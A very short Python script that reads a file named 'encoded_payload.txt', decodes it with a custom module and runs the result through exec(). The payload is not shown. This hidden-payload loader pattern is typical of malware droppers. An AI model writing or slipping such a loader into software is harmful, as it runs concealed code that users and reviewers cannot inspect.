import decode


with open('encoded_payload.txt', 'r') as file:
    payload = file.read()
    exec(decode.MASTER(payload))